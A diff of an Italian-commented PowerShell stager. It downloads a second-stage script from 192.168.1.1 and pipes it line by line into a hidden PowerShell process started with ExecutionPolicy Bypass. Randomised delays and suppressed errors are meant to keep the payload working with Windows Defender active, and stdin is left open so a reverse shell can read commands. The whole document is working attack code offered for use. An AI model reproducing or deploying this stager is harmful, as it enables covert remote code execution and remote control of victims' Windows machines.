@@ -1,30 +1,39 @@
 # Stager powershell utilizzato per attivare il second stage (altro script powershell) su macchina windows. Se il secondo stage è stato testato attivandolo direttamente da riga di comando con windows defender attivo e ha funzionato, allora con questo stager il second stage funzionerà ancora.
 
 # URL to second stage
-$url = "http://192.168.1.1/script.ps1"
+$url = "http://192.168.1.1/second.txt"
+$scriptString = (New-Object Net.WebClient).DownloadString($url)
+$scriptLines = $scriptString -split "`r?`n"
 
-# Get second stage payload
-$scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell.exe"
+$psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass"
+$psi.UseShellExecute = $false
+$psi.RedirectStandardInput = $true
+$psi.RedirectStandardOutput = $true
+$psi.RedirectStandardError = $true
+$psi.CreateNoWindow = $true
 
-# Convert payload into a String
-$scriptString = [System.Text.Encoding]::UTF8.GetString($scriptContent.Content)
+$process = [System.Diagnostics.Process]::Start($psi)
+Start-Sleep -Seconds 1.2
 
-# Open PowerShell
-$powershell = New-Object System.Diagnostics.ProcessStartInfo
-$powershell.FileName = "powershell.exe"
-$powershell.Arguments = "-NoExit -Command `"New-PSSession -Name 'RemoteSession' -NoNewWindow`""
-$powershell.UseShellExecute = $false
-$powershell.RedirectStandardInput = $true
-$powershell.RedirectStandardOutput = $true
-$powershell.RedirectStandardError = $true
-$powershell.CreateNoWindow = $true
+# 1. INIT error handling
+$process.StandardInput.WriteLine('$ErrorActionPreference = "SilentlyContinue"')
+$process.StandardInput.Flush()
+Start-Sleep -Milliseconds 200
 
-$process = [System.Diagnostics.Process]::Start($powershell)
+# 2. INVIO script line-by-line
+foreach ($line in $scriptLines) {
+    if ($line.Trim()) {
+        $process.StandardInput.WriteLine($line.TrimEnd())
+        $process.StandardInput.Flush()
+        Start-Sleep -Milliseconds (50..150 | Get-Random)
+    }
+}
 
-# Wait for Powershell to be opned
-Start-Sleep -Seconds 1
+# 🔥 CRITICO: TRIGGER FINALE - ESEGUE tutto!
+$process.StandardInput.WriteLine('')  # Nuova riga
+$process.StandardInput.Flush()
+Start-Sleep -Milliseconds 500
 
-# Send payload to powershell one line at time
-$process.StandardInput.WriteLine($scriptString)
-$process.StandardInput.WriteLine("exit")
-$process.StandardInput.Close()
+# NON chiudere stdin - reverse shell deve leggere comandi
